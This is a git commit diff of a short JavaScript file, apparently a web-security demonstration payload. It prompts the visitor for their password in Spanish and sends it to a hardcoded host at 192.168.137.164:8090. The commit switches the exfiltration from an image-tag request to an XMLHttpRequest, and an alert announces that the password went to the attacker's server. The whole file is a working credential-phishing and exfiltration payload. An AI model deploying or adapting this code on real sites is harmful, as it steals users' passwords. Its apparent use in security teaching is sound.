db95745807d55bf8ee3179bb0d400986945f5b59
Omar Espino <omespino@gmail.com>
2024-09-05 12:41:50 -0700

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,12 +1,12 @@
 var pass=prompt('Para continuar inserta tu contraseña');
-//alert(pass)
+alert('contraseña: ' + pass+ ', enviada al server del atacante ;) - omespino websec')
 
-// function send_response(response){
-// 	var oReqX = new XMLHttpRequest();
-// 	oReqX.open("GET","https://192.168.137.164:8090/");
-// 	oReqX.send(response);
-// }
-document.write('<img src=http://192.168.137.164:8090/'+pass+'>');
+function send_response(response){
+	var oReqX = new XMLHttpRequest();
+	oReqX.open("GET","https://192.168.137.164:8090/");
+	oReqX.send(response);
+}
+// document.write('<img src=http://192.168.137.164:8090/'+pass+'>');
 
 send_response(pass)
 
